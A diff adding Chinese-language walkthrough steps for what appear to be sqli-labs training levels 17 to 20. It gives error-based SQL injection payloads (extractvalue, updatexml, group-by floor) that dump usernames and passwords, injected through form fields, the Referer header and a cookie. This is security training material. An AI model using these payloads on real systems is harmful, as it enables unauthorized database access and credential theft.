@@ -190,3 +190,19 @@ group by报错注入
 1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
 ~~~
 #### 第十八题
+~~~
+1' ,2, (extractvalue(1,concat(0x5c,(select group_concat(password,username) from users),0x5c)))#   爆账户密码。
+1',2,updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#   爆账户密码。
+~~~
+#### 第十九题
+十九关当我们输入正确的账户密码我们的referer字段内容会显示在页面上。该插入的sql语句有两个参数一个是referfer,还有ip地址。下面代码可以报错账户密码。前面的大家自己构造了。
+~~~
+1',updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#
+~~~
+#### 第二十题
+第二十关当我们输入正确页面时候cookie字段显示在页面上，进行抓包。进行注入
+~~~
+'and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
+~~~
+
+ 
